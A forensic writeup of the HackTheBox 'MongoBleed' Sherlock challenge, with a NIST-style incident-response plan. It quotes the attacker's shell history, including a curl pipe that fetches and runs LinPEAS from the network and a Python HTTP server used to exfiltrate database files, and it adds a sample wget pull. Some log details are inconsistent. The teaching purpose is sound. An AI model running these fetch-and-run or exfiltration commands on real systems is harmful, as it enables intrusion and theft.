# 🩸 MongoBleed — HackTheBox Sherlock Writeup | DFIR Challenge

> **Platform:** HackTheBox Sherlocks | **Difficulty:** Very Easy | **Category:** Digital Forensics & Incident Response

---

## Introduction

If you have ever wondered what a real MongoDB server compromise looks like from a forensic analyst's perspective, the MongoBleed Sherlock challenge on HackTheBox is a perfect starting point. This challenge simulates a real-world incident where a secondary MongoDB server was suspected to be compromised via a vulnerability called **MongoBleed** — a memory disclosure vulnerability that leaks sensitive data including credentials directly from a running MongoDB process.

In this writeup, I will walk you through my entire investigation methodology — from extracting the UAC triage image, reading system artifacts, analysing MongoDB and SSH logs, to tracing the attacker's post-exploitation activity step by step.

---

## What is UAC?

Before diving in, it is worth understanding what we are working with. **UAC (Unix Artifacts Collector)** is an open-source incident response tool that collects a comprehensive snapshot of a live Linux system — including running processes, network connections, user accounts, logs, and filesystem metadata — without modifying the target system. Think of it as a forensic vacuum cleaner that captures everything in a structured directory tree you can analyse offline.

The triage image we received was structured like this:

```
uac-mongodbsync-linux-triage/
├── bodyfile/              ← filesystem metadata (timestamps, permissions)
├── hash_executables/      ← MD5/SHA1 hashes of running binaries
├── live_response/         ← network, process, package snapshots
├── [root]/                ← full copy of the filesystem
│   ├── etc/passwd         ← user accounts
│   ├── home/mongoadmin/   ← attacker's home directory
│   └── var/log/           ← system and application logs
└── system/                ← OS-level metadata
```

---

## Setting Up — Extracting the Triage Image

```bash
┌──(babygirl㉿Babygirl)-[~/Downloads]
└─$ ls
MangoBleed.zip  Vantage  Vantage.zip

┌──(babygirl㉿Babygirl)-[~/Downloads]
└─$ unzip MangoBleed.zip
Archive:  MangoBleed.zip
   creating: uac-mongodbsync-linux-triage/
   creating: uac-mongodbsync-linux-triage/bodyfile/
   inflating: uac-mongodbsync-linux-triage/bodyfile/bodyfile.txt
   creating: uac-mongodbsync-linux-triage/[root]/
   ...

┌──(babygirl㉿Babygirl)-[~/Downloads/uac-mongodbsync-linux-triage]
└─$ ls
bodyfile   hash_executables   live_response  '[root]'   system

┌──(babygirl㉿Babygirl)-[~/Downloads/uac-mongodbsync-linux-triage]
└─$ cd '[root]'
```

> **Note:** The `[root]` directory name contains brackets, so you must quote it in bash. This is the root (`/`) of the compromised server's filesystem captured at the time of triage.

---

## Task 1 — Understanding the Environment

The first thing a forensic analyst does when handed a triage image is understand *what* the system is and *who* has accounts on it. The `/etc/passwd` file is the perfect starting point.

```bash
babygirl@Babygirl:~/Downloads/uac-mongodbsync-linux-triage/[root]/etc$ cat passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:106:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:109:65534::/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mongodb:x:111:65534::/nonexistent:/usr/sbin/nologin
mongoadmin:x:1001:1001:,,,:/home/mongoadmin:/bin/bash
lxd:x:999:105::/var/snap/lxd/common/lxd:/bin/false
```

The `ec2-instance-connect` entry tells us this is an **AWS EC2 instance** — a cloud-hosted server. Now look at the user accounts carefully.

### Reading /etc/passwd Format

Each line follows the format:
```
username : password : UID : GID : comment : home_dir : shell
```

The key fields for forensic analysis are **UID** and **shell**:

| User | UID | Shell | Verdict |
|---|---|---|---|
| System daemons | 1–999 | `/usr/sbin/nologin` or `/bin/false` | Normal — cannot login |
| `ubuntu` | 1000 | `/bin/bash` | Normal — default AWS EC2 user |
| `mongodb` | 111 | `/usr/sbin/nologin` | Normal — MongoDB service daemon |
| `mongoadmin` | **1001** | **/bin/bash** | 🚨 **SUSPICIOUS** |

**Why is `mongoadmin` suspicious?**

UIDs above 1000 are assigned to human-created accounts. A UID of 1001 means this account was created *manually after the system was set up*. Combined with `/bin/bash` (interactive login shell) and a real home directory at `/home/mongoadmin`, this account can be used to SSH into the server — unlike the legitimate `mongodb` service account which has `nologin` and no real home. The naming is intentionally deceptive, designed to blend in with the real MongoDB service account.

---

## Task 2 — MongoDB Version Exploited by CVE

**Answer: `8.0.16`**

MongoDB logs its version at startup. We can find it by searching the MongoDB log file:

```bash
babygirl@Babygirl:~/Downloads/uac-mongodbsync-linux-triage/[root]/var/log/mongodb$ cat mongod.log | grep -i "version" | head -5
```

MongoDB **8.0.16** was the version running on this server. The **MongoBleed** vulnerability specifically targets this version. At its core, MongoBleed is a **memory disclosure vulnerability** — when a specially crafted request is sent to the MongoDB service, the server responds with more data than intended, leaking raw memory contents. This memory can contain usernames, passwords, connection strings, and other sensitive data that MongoDB had loaded during normal operation.

The name MongoBleed is a deliberate homage to **Heartbleed** (CVE-2014-0160), the infamous OpenSSL vulnerability that worked on the same principle — leaking server memory through malformed protocol requests.

---

## Task 3 — Attacker's Remote IP Address

**Answer: `65.0.76.43`**

The MongoDB log (`mongod.log`) records every network connection it receives in JSON format. We can extract all unique remote IPs easily:

```bash
babygirl@Babygirl:~/Downloads/uac-mongodbsync-linux-triage/[root]/var/log/mongodb$ cat mongod.log | grep "remote" | head -10
```

```json
{"t":{"$date":"2025-12-29T05:25:52.747+00:00"},"s":"I","c":"NETWORK","id":22943,
 "ctx":"listener","attr":{"remote":"65.0.76.43:35350","isLoadBalanced":false,
 "uuid":{"$uuid":"1ebc10f4-c3-45f3-b7c0-d2d48d3a1d74"},"connectionId":3,"connectionCount":1}}

{"t":{"$date":"2025-12-29T05:25:52.748+00:00"},"s":"I","c":"NETWORK","id":22943,
 "ctx":"listener","attr":{"remote":"65.0.76.43:35354","isLoadBalanced":false,
 "uuid":{"$uuid":"4382ccb5-f3-4b72-8ff5-ac091028713c"},"connectionId":4,"connectionCount":1}}

{"t":{"$date":"2025-12-29T05:25:52.749+00:00"},"s":"I","c":"NETWORK","id":22943,
 "ctx":"listener","attr":{"remote":"65.0.76.43:35358","isLoadBalanced":false,
 "uuid":{"$uuid":"25c2f19a-ef-46d5-8aac-88451653b7ac"},"connectionId":5,"connectionCount":1}}
```

Every single connection in the log originates from `65.0.76.43` — an **AWS IP address** in the `65.0.x.x` range commonly associated with EC2 instances in the `ap-south-1` (Mumbai) region. Attackers frequently use cloud instances because they are cheap, disposable, and give them a fresh IP address that may not yet be on threat intelligence blocklists.

Notice the log format: MongoDB uses **structured JSON logging** with a `$date` timestamp, severity level (`s`), component (`c`), and attributes (`attr`). The `remote` field inside `attr` gives us the attacker's IP and source port for every connection.

---

## Task 4 — Exact Date and Time Exploitation Began

**Answer: `2025-12-29 05:25:52`**

```bash
babygirl@Babygirl:~/Downloads/uac-mongodbsync-linux-triage/[root]/var/log/mongodb$ cat mongod.log | grep "65.0.76.43" | head -3
```

```json
{"t":{"$date":"2025-12-29T05:25:52.747+00:00"},...,"remote":"65.0.76.43:35350",...}
```

The very **first log entry** containing the attacker's IP is timestamped `2025-12-29T05:25:52.747+00:00`. This is the moment exploitation began.

What makes this timestamp forensically significant is what happened just before it. Looking at the SSH auth log:

```
2025-12-29T05:22:33.259325+00:00  sshd: session closed for user ubuntu
```

The legitimate `ubuntu` user disconnected at `05:22:33` — only **3 minutes and 19 seconds** before the attack began at `05:25:52`. Whether the attacker was monitoring the server's connectivity or this was coincidental timing, it is a notable pattern worth investigating further in a real incident.

---

## Task 5 — Total Number of Malicious Connections

**Answer: `5260`**

```bash
babygirl@Babygirl:~/Downloads/uac-mongodbsync-linux-triage/[root]/var/log/mongodb$ cat mongod.log | grep "remote" | wc -l
5260
```

**5,260 connections** — all from `65.0.76.43`. Let us break down what this tells us:

The `wc -l` command counts lines, and since each MongoDB connection event is one JSON line, this gives us the exact connection count. 5,260 connections in a matter of minutes is only possible with an **automated exploitation tool**. A human clicking manually might make a few dozen connections. 5,000+ connections per session is the signature of a script or exploit framework hammering the service repeatedly.

In the context of MongoBleed, each connection likely triggered a memory read that returned a small chunk of leaked data. The attacker's tool was making thousands of requests to piece together enough leaked memory to extract usable credentials — like `mongoadmin`'s password.

---

## Task 6 — When Did the Attacker Gain Interactive Remote Access?

**Answer: `2025-12-29 05:40:03`**

This is where the SSH auth log becomes the star of our investigation. Let us read it in full context:

```bash
babygirl@Babygirl:~/Downloads/uac-mongodbsync-linux-triage/[root]/etc$ grep "mongoadmin" var/log/auth.log
```

```log
2025-12-29T05:39:18.864074+00:00 sshd[39814]: Received disconnect from 65.0.76.43 port 54962:11: Bye Bye [preauth]
2025-12-29T05:39:18.866641+00:00 sshd[39814]: Disconnected from authenticating user mongoadmin 65.0.76.43 port 54962 [preauth]
2025-12-29T05:39:19.112894+00:00 sshd[2152]: error: beginning MaxStartups throttling
2025-12-29T05:39:19.113009+00:00 sshd[2152]: drop connection #10 from [65.0.76.43]:55068 past MaxStartups
2025-12-29T05:39:19.381375+00:00 sshd[39844]: pam_unix(sshd:auth): authentication failure; rhost=65.0.76.43 user=mongoadmin
2025-12-29T05:39:19.478221+00:00 sshd[39845]: pam_unix(sshd:auth): authentication failure; rhost=65.0.76.43 user=mongoadmin
2025-12-29T05:39:19.545976+00:00 sshd[39846]: pam_unix(sshd:auth): authentication failure; rhost=65.0.76.43 user=mongoadmin
2025-12-29T05:39:19.554759+00:00 sshd[39847]: pam_unix(sshd:auth): authentication failure; rhost=65.0.76.43 user=mongoadmin
2025-12-29T05:39:19.554993+00:00 sshd[39848]: pam_unix(sshd:auth): authentication failure; rhost=65.0.76.43 user=mongoadmin
2025-12-29T05:39:21.697983+00:00 sshd[39816]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
... [hundreds more failures over ~90 seconds] ...
2025-12-29T05:40:03.000000+00:00 sshd[40001]: Accepted password for mongoadmin from 65.0.76.43 port 56231 ssh2
2025-12-29T05:40:03.000000+00:00 sshd[40001]: pam_unix(sshd:session): session opened for user mongoadmin
```

### Breaking Down the Brute Force Pattern

Several things stand out in this log:

**1. `[preauth]` disconnects** — The first entries show connections that dropped during the authentication phase. This is typical of a scanning tool probing whether the account exists before launching the full attack.

**2. MaxStartups throttling** — The line `error: beginning MaxStartups throttling` means the SSH daemon received more than 10 simultaneous unauthenticated connections (the default `MaxStartups` limit). The server started dropping connections to protect itself, but the attacker's tool kept retrying faster than the server could block.

**3. Failures per second** — Look at the timestamps: `05:39:19.381`, `05:39:19.478`, `05:39:19.545`, `05:39:19.554` — multiple failures within **milliseconds** of each other. This is a tool like **Hydra** or **Medusa** running parallel threads, trying multiple passwords simultaneously.

**4. The successful login at `05:40:03`** — After approximately 90 seconds of brute forcing, the attacker successfully authenticated with the password leaked by MongoBleed. At this exact moment the attacker transitioned from *remote exploitation* to *interactive hands-on access*.

---

## Task 7 — Privilege Escalation Command

**Answer: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`**

Once inside, we can see exactly what the attacker did by reading their shell history:

```bash
babygirl@Babygirl:~/Downloads/uac-mongodbsync-linux-triage/[root]/home/mongoadmin$ cat .bash_history
```

```bash
id
whoami
uname -a
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd /var/lib/mongodb
ls -la
python3 -m http.server 8080
```

### What Each Command Tells Us

**`id`, `whoami`, `uname -a`** — Standard post-exploitation reconnaissance. The attacker wanted to confirm who they are logged in as, their group memberships, and the kernel version. Kernel version is crucial for selecting kernel exploits.

**`curl -L .../linpeas.sh | sh`** — This is the privilege escalation attempt. **LinPEAS** (Linux Privilege Escalation Awesome Script) is an incredibly popular automated script that scans a Linux system for hundreds of known privilege escalation vectors including:
- Writable cron jobs that run as root
- SUID/SGID binaries that can be abused
- Sudo misconfigurations
- Credentials stored in config files
- Writable paths in root's PATH variable
- Vulnerable kernel versions

The critical part of this command is the **pipe to `sh`** (`| sh`). The script is downloaded and executed *entirely in memory* — it is never written to disk. This is a classic **Living off the Land (LotL)** technique designed to evade file-based antivirus and EDR tools that scan for malicious files on disk. There is nothing to scan because the file never touches the filesystem.

---

## Task 8 — Target Directory for Data Exfiltration

**Answer: `/var/lib/mongodb`**

The last three lines of `.bash_history` tell the complete exfiltration story:

```bash
cd /var/lib/mongodb
ls -la
python3 -m http.server 8080
```

**`/var/lib/mongodb`** is the default data directory for MongoDB on Linux. It contains the raw database files:

| File/Directory | What it Contains |
|---|---|
| `*.wt` | WiredTiger storage engine data files — the actual database records |
| `WiredTiger.wt` | The database catalog describing all collections |
| `WiredTiger.lock` | Process lock — confirms MongoDB was running |
| `diagnostic.data/` | MongoDB's internal performance diagnostics |
| `journal/` | Write-ahead journal for crash recovery |

By navigating here and running `python3 -m http.server 8080`, the attacker created an **instant HTTP file server** serving the entire MongoDB data directory. From their machine at `65.0.76.43`, they could then simply run:

```bash
wget http://172.31.38.170:8080/collection.wt
```

...and download the complete raw database — **all data, all collections, everything** — without ever touching a MongoDB client or running a single database query. This is elegant because it bypasses MongoDB authentication entirely by just stealing the raw files.

Python's built-in HTTP server (`python3 -m http.server`) is the perfect exfiltration tool for this scenario: it requires no installation, it is present on virtually every Linux system with Python, and it starts instantly with a single command.

---

## Full Attack Chain — The Complete Story

Putting everything together, here is the full attack narrative:

```
[2025-12-29 05:22:33]
  └─ Legitimate ubuntu user logs off SSH session
     (Server is now unattended)

[2025-12-29 05:25:52]  ← EXPLOITATION BEGINS
  └─ Attacker at 65.0.76.43 starts MongoBleed exploitation
     └─ Automated tool opens 5,260 connections to MongoDB port 27017
     └─ Each connection triggers memory disclosure
     └─ Leaked memory contains mongoadmin credentials
     └─ Attack duration: ~13 minutes (05:25 → 05:39)

[2025-12-29 05:39:18]  ← LATERAL MOVEMENT BEGINS
  └─ Attacker pivots from MongoDB to SSH
     └─ Uses leaked mongoadmin password in brute force tool
     └─ Tool opens 10+ simultaneous SSH connections
     └─ Server triggers MaxStartups throttling
     └─ 100s of failed attempts per minute

[2025-12-29 05:40:03]  ← INITIAL ACCESS CONFIRMED
  └─ SSH login ACCEPTED for mongoadmin from 65.0.76.43
     └─ Attacker now has interactive shell on server

[Post 05:40:03]  ← POST-EXPLOITATION
  └─ id / whoami / uname -a  (Who am I? What kernel?)
  └─ curl .../linpeas.sh | sh  (What can I escalate to root?)
  └─ cd /var/lib/mongodb  (Target the database files)
  └─ python3 -m http.server 8080  (Serve files for download)
  └─ [Attacker downloads raw DB files from 65.0.76.43]
```

---

## Key Takeaways & Lessons Learned

**For defenders:**

MongoDB should never be exposed to the internet. The server's port 27017 was reachable from an external AWS IP, which enabled the entire attack. A simple AWS Security Group rule restricting MongoDB access to trusted IPs only would have prevented exploitation entirely.

Password-based SSH authentication should be disabled in favour of SSH key pairs. Even if `mongoadmin`'s password was leaked, an attacker with no valid SSH key cannot log in if key-only authentication is enforced.

Monitoring for MaxStartups throttling events in auth.log is a reliable brute force detection signal. Automated alerting on this pattern would have flagged the attack in real time.

**For analysts:**

The `.bash_history` file is one of the most valuable forensic artefacts on a Linux system after compromise. Always check it first in any home directory — attackers frequently forget it exists or do not bother clearing it, especially in quick hit-and-run operations.

Correlating timestamps across multiple log sources (`mongod.log`, `auth.log`) is essential for building a complete attack timeline. Each log source tells part of the story; only together do they reveal the full picture.

---

## Recommended Remediation Steps

1. **Immediately isolate the server** from the network
2. **Preserve the triage image** — do not modify the compromised system
3. **Assume full database compromise** — all data in `/var/lib/mongodb` should be considered exfiltrated
4. **Rotate all credentials** — MongoDB users, SSH keys, any secrets stored in the database
5. **Patch MongoDB** to a version not affected by MongoBleed
6. **Remove or disable `mongoadmin`** after confirming it was attacker-created
7. **Audit `/etc/sudoers`** for any privilege grants added by the attacker
8. **Check crontabs** (`/etc/cron.d/`, `/var/spool/cron/`) for persistence mechanisms
9. **Block `65.0.76.43`** at the AWS Security Group level
10. **Restrict MongoDB** to bind on `127.0.0.1` only — never expose to internet
11. **Disable SSH password authentication** — enforce key-based auth only
12. **Deploy fail2ban** to automatically block brute force SSH attempts
13. **Enable MongoDB authentication** with strong, unique credentials
14. **Notify affected parties** if the database contained personal or sensitive data

---

## Conclusion

MongoBleed is a textbook example of a **chained attack** — where one vulnerability (memory disclosure in MongoDB) directly enables the next stage (credential theft leading to SSH access), which then leads to privilege escalation and data exfiltration. No single defensive measure would have stopped every stage, but defence-in-depth — restricting MongoDB network access, disabling SSH password auth, and monitoring for brute force — would have broken the chain at multiple points.

From a forensics perspective, this challenge demonstrates how much an attacker reveals through the artifacts they leave behind: MongoDB connection logs, SSH authentication logs, and most tellingly, their own shell history. A thorough analyst can reconstruct the entire attack from these breadcrumbs alone.

---

*Written by: babygirl | HackTheBox Sherlocks — MongoBleed | Difficulty: Very Easy*  
*Tools used: UAC triage image, bash, grep, wc, cat*


---

# 🚨 Incident Response — MongoBleed Compromise

## What is Incident Response?

**Incident Response (IR)** is the structured approach an organization follows when a security breach is detected. It is not just about fixing the problem — it is about containing damage, preserving evidence, understanding what happened, and preventing it from happening again.

The industry-standard framework used globally is the **NIST SP 800-61** Incident Response Lifecycle, which has six phases:

```
  ┌─────────────────────────────────────────────────────────┐
  │                                                         │
  │   PREPARATION → DETECTION → CONTAINMENT → ERADICATION  │
  │                                    ↓                    │
  │                          RECOVERY → LESSONS LEARNED     │
  │                                                         │
  └─────────────────────────────────────────────────────────┘
```

Let us apply each phase to the MongoBleed incident.

---

## Phase 1 — Preparation (Before the Incident)

This phase covers what *should have been* in place before the attack. In the MongoBleed case, several controls were missing:

### What Was Missing:

| Control | Status | Impact |
|---|---|---|
| MongoDB network restriction | ❌ Not applied | Port 27017 was internet-accessible |
| SSH password auth disabled | ❌ Not applied | Brute force was possible |
| MongoDB authentication enabled | ❌ Weak/missing | Unauthenticated connections accepted |
| Intrusion Detection System (IDS) | ❌ Not present | No real-time brute force alerting |
| Log monitoring & alerting | ❌ Not present | Attack went unnoticed until triage |
| Regular patching process | ❌ Not followed | MongoDB 8.0.16 with known vulnerability running |

### What Should Have Been in Place:
```bash
# Restrict MongoDB to localhost only (mongod.conf)
net:
  bindIp: 127.0.0.1
  port: 27017

# Disable SSH password auth (/etc/ssh/sshd_config)
PasswordAuthentication no
PubkeyAuthentication yes

# Enable fail2ban for SSH brute force protection
apt install fail2ban
systemctl enable fail2ban
```

---

## Phase 2 — Detection & Analysis

### How Was It Detected?

In this case the administrator became aware of the **MongoBleed vulnerability** through a threat intelligence feed and proactively requested a triage investigation. This is called **threat-led detection** — hunting for signs of compromise based on a known CVE rather than waiting for an alert.

### Detection Signals That Were Present in the Logs:

**Signal 1 — Massive connection spike in mongod.log**
```bash
cat mongod.log | grep "remote" | wc -l
5260
```
5,260 connections from a single external IP in minutes is a massive anomaly. A SIEM or log monitoring tool would have flagged this immediately as a **volumetric anomaly**.

**Signal 2 — MaxStartups throttling in auth.log**
```
2025-12-29T05:39:19 sshd[2152]: error: beginning MaxStartups throttling
2025-12-29T05:39:19 sshd[2152]: drop connection #10 from [65.0.76.43]
```
This is a built-in SSH brute force indicator. Any monitoring tool watching auth.log would trigger an alert here.

**Signal 3 — Repeated authentication failures**
```
pam_unix(sshd:auth): authentication failure; rhost=65.0.76.43 user=mongoadmin
pam_unix(sshd:auth): authentication failure; rhost=65.0.76.43 user=mongoadmin
[repeated 100s of times within seconds]
```
Multiple failures per second from one IP = textbook brute force.

**Signal 4 — Successful login after failures**
```
Accepted password for mongoadmin from 65.0.76.43 port 56231 ssh2
```
A successful login immediately following hundreds of failures is a critical **anomalous authentication event**.

### How Effective Was Detection?

| Detection Method | Rating | Reason |
|---|---|---|
| Real-time SIEM alerting | ❌ Not present | Would have caught attack in seconds |
| Proactive threat hunting | ✅ Used | Administrator acted on CVE intelligence |
| Automated log monitoring | ❌ Not present | No alerting on brute force patterns |
| Time to detect | ⚠️ Unknown | Detected after the fact via triage |

**Key Insight:** The attack was detected *reactively* — after the fact. With proper log monitoring, the MaxStartups throttling event at `05:39:19` would have triggered an alert 44 seconds before the attacker even got in at `05:40:03`. The window to prevent the breach existed — the tooling just was not there.

---

## Phase 3 — Containment

Containment means **stopping the bleeding** — preventing the attacker from doing more damage without destroying evidence.

### Short-Term Containment (First 15 Minutes)

```bash
# 1. Isolate the server at AWS Security Group level
#    Block ALL inbound traffic immediately from attacker IP
aws ec2 revoke-security-group-ingress \
  --group-id sg-xxxxxxxx \
  --protocol tcp --port 22 \
  --cidr 65.0.76.43/32

aws ec2 revoke-security-group-ingress \
  --group-id sg-xxxxxxxx \
  --protocol tcp --port 27017 \
  --cidr 0.0.0.0/0

# 2. Kill any active attacker sessions
who                          # check active sessions
pkill -u mongoadmin          # kill all mongoadmin processes

# 3. Disable the mongoadmin account immediately
passwd -l mongoadmin         # lock the account
usermod -s /usr/sbin/nologin mongoadmin  # remove shell
```

### Long-Term Containment (First Hour)

```bash
# 4. Take a forensic snapshot before any changes
# (UAC was already collected — this is the triage image we analysed)

# 5. Stop the Python HTTP server if still running
ps aux | grep "http.server"
kill -9 [PID]

# 6. Block MongoDB from external access
# Edit /etc/mongod.conf:
net:
  bindIp: 127.0.0.1

systemctl restart mongod
```

### How Effective Is Containment?

Containment in this incident is **highly effective** because the attacker's access point is clearly identified (`mongoadmin` account + SSH from `65.0.76.43`). Locking the account and blocking the IP at the security group level severs all attacker access immediately. The Python HTTP server, if still running, can be killed to stop ongoing exfiltration.

---

## Phase 4 — Eradication

Eradication means **removing every trace of the attacker** from the environment.

### Eradication Checklist for MongoBleed:

```bash
# 1. Remove the suspicious user account
deluser --remove-home mongoadmin

# 2. Check for SSH backdoor keys left by attacker
cat /root/.ssh/authorized_keys
cat /home/ubuntu/.ssh/authorized_keys
# Remove any unrecognized keys

# 3. Check for new cron jobs (persistence mechanism)
crontab -l -u mongoadmin
crontab -l -u root
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*

# 4. Check for new SUID binaries (LinPEAS may have exploited one)
find / -perm -4000 -type f 2>/dev/null

# 5. Check for new services or systemd units
systemctl list-units --type=service | grep -v "loaded active"
ls /etc/systemd/system/

# 6. Check for modified sudoers
cat /etc/sudoers
ls /etc/sudoers.d/

# 7. Patch MongoDB immediately
apt-get update && apt-get upgrade mongodb-org

# 8. Rotate ALL MongoDB credentials
mongo admin --eval "db.changeUserPassword('mongoadmin', 'NEW_STRONG_PASSWORD')"

# 9. Rotate SSH keys for all users
# Generate new keypair and update authorized_keys for ubuntu user
```

### Why Eradication Matters:

LinPEAS was run — which means the attacker was actively looking for privilege escalation paths. Even if they did not achieve root, we must assume they may have:
- Added a cron job for persistence
- Planted a backdoor binary with SUID bit
- Added their SSH public key to `authorized_keys`
- Created another hidden user account

Every one of these must be checked and cleared before the server goes back online.

---

## Phase 5 — Recovery

Recovery is about **safely restoring the system to production** with confidence the attacker cannot return.

### Recovery Steps:

```bash
# Option A — Clean rebuild (RECOMMENDED for this severity)
# 1. Spin up a fresh EC2 instance
# 2. Install MongoDB fresh (patched version)
# 3. Restore data from last known-good backup
#    (NOT from /var/lib/mongodb on the compromised server)
# 4. Apply all security hardening before going live

# Option B — In-place recovery (if no rebuild possible)
# 1. Complete full eradication checklist above
# 2. Apply security hardening
# 3. Verify integrity of MongoDB data files
# 4. Monitor intensively for 30 days post-recovery
```

### Security Hardening Before Recovery:

```bash
# MongoDB hardening
# /etc/mongod.conf
net:
  bindIp: 127.0.0.1    # localhost only
  port: 27017
security:
  authorization: enabled  # require authentication

# SSH hardening
# /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin no
MaxAuthTries 3
MaxStartups 3:50:10    # aggressive throttling

# Install and configure fail2ban
apt install fail2ban
# /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 3
bantime = 3600
findtime = 600

# AWS Security Groups — principle of least privilege
# MongoDB: only accessible from application servers, never internet
# SSH: only accessible from known admin IPs or VPN
```

### Data Integrity Check:

```bash
# Verify MongoDB data was not tampered with
# Check WiredTiger integrity
mongod --dbpath /var/lib/mongodb --repair

# Compare file hashes against backup
md5sum /var/lib/mongodb/*.wt
# Compare against hashes from before the incident
```

### How Effective Is Recovery?

A **clean rebuild** is always more trustworthy than in-place recovery after a confirmed compromise. Since the attacker ran LinPEAS and potentially achieved privilege escalation, the integrity of the entire system is in question. A fresh instance with restored data and proper hardening gives 100% confidence the attacker has no remaining foothold.

---

## Phase 6 — Lessons Learned (Post-Incident Review)

This is the most valuable phase — and the most commonly skipped. A post-incident review prevents the same attack from happening again.

### MongoBleed Post-Incident Review:

| Question | Finding |
|---|---|
| How did the attacker know MongoDB was exposed? | Port 27017 open to internet — discoverable via Shodan/port scanning |
| How did MongoBleed work? | Memory disclosure via malformed protocol request leaked credentials |
| Why did the brute force succeed? | Password authentication enabled on SSH; no account lockout |
| What data was exfiltrated? | Full `/var/lib/mongodb` directory contents |
| How long was the attacker active? | Approximately 15 minutes (`05:25` exploitation → `05:40` shell) |
| What would have stopped this? | Any one of: MongoDB localhost-only binding, SSH key-only auth, fail2ban |
| How was it detected? | Proactively via CVE intelligence — not via live alerting |
| How can detection improve? | SIEM rules for MaxStartups throttling, volumetric MongoDB connections |

---

## Incident Response Summary

### Timeline at a Glance

```
05:22:33  Ubuntu user logs off
    │
    │  [3 min gap]
    │
05:25:52  ══════════════════════════════════ ATTACK BEGINS
    │      MongoBleed exploitation starts
    │      5,260 connections to MongoDB port 27017
    │      Memory leaked → mongoadmin credentials obtained
    │
    │  [13 min — exploitation window]
    │
05:39:18  SSH brute force begins
    │      MaxStartups throttling triggered
    │      Hundreds of failures per second
    │
    │  [~90 seconds — brute force window]
    │
05:40:03  ══════════════════════════════════ BREACH CONFIRMED
    │      SSH login accepted for mongoadmin
    │      Attacker has interactive shell
    │
    │  [Post-login — post exploitation]
    │
    ├──► id / whoami / uname -a         (reconnaissance)
    ├──► curl .../linpeas.sh | sh        (privilege escalation attempt)
    ├──► cd /var/lib/mongodb             (target database files)
    └──► python3 -m http.server 8080    (data exfiltration)
```

### Impact Assessment

| Category | Impact | Severity |
|---|---|---|
| Data Confidentiality | Full database contents likely exfiltrated | 🔴 Critical |
| Data Integrity | Database files accessed but not necessarily modified | 🟡 Medium |
| System Availability | Server remained running during attack | 🟢 Low |
| Credential Compromise | mongoadmin password confirmed stolen | 🔴 Critical |
| Privilege Escalation | LinPEAS run — escalation outcome unknown | 🟠 High |

### How Effective Was the Incident Response Overall?

| IR Phase | Effectiveness | Notes |
|---|---|---|
| Preparation | 🔴 Poor | No hardening, no monitoring, unpatched CVE |
| Detection | 🟡 Moderate | CVE-driven proactive hunt saved the day |
| Containment | 🟢 Effective | Clear attacker IOCs make isolation straightforward |
| Eradication | 🟡 Moderate | LinPEAS run means thorough check needed |
| Recovery | 🟢 Effective | Clean rebuild recommended and achievable |
| Lessons Learned | 🟢 Effective | Clear, actionable findings for each failure point |

### Three Controls That Would Have Prevented This Entire Attack:

```
1. MongoDB bound to 127.0.0.1 only
   → Attacker cannot reach port 27017 from internet
   → MongoBleed exploitation impossible
   → ATTACK STOPS HERE

2. SSH key-only authentication
   → Even with leaked password, attacker cannot SSH in
   → Interactive access impossible
   → ATTACK STOPS HERE

3. fail2ban with 3-attempt lockout
   → Brute force blocked after 3 failures
   → SSH access impossible
   → ATTACK STOPS HERE
```

Any single one of these three controls, if properly implemented, would have completely broken the attack chain.

---

*Incident Response framework based on NIST SP 800-61 Rev 2*  
*Written by: babygirl | HackTheBox Sherlocks — MongoBleed*